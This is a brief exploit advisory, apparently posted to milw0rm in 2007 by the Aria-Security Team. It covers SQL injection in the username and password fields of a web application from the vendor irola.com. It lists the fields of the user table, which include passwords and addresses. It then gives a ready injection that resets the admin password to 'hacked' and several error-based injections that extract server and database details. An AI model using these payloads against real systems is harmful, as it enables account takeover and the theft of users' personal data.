@@ -1,0 +1,41 @@
+Aria-Security Team
+http://Aria-Security.Net
+-----------------------------
+Original Advisory @ http://aria-security.net/forum/showthread.php?p=1106
+Vendor: http://www.irola.com
+
+Username/Password Fields can run SQL Queries. Therefore:
+We get the Tables:
+
+UserInfo.UserID
+UserInfo.Login
+UserInfo.Password
+UserInfo.UserNumber
+UserInfo.FirstName
+UserInfo.LastName
+UserInfo.TeamID
+UserInfo.Address
+UserInfo.City
+UserInfo.ZipCode
+UserInfo.CountryID
+UserInfo.Phone
+
+
+
+Useful Injection: (changes admin's passwsord to hacked)
+-1' UPDATE UserInfo set Password= 'hacked' Where(UserID= '1');--
+
+these  may help the attacker to get more info:
+
+1' or 1=convert(int,@@version)--
+1' or 1=convert(int,@@servername)--
+1' or 1=convert(int,db_name())--
+1' or 1=convert(int,user_name())--
+1' or 1=convert(int,system_user)--
+
+Greetz: AurA
+Credits goes to Aria-Security Team
+Regards,
+The-0utl4w
+
+# milw0rm.com [2007-11-23]
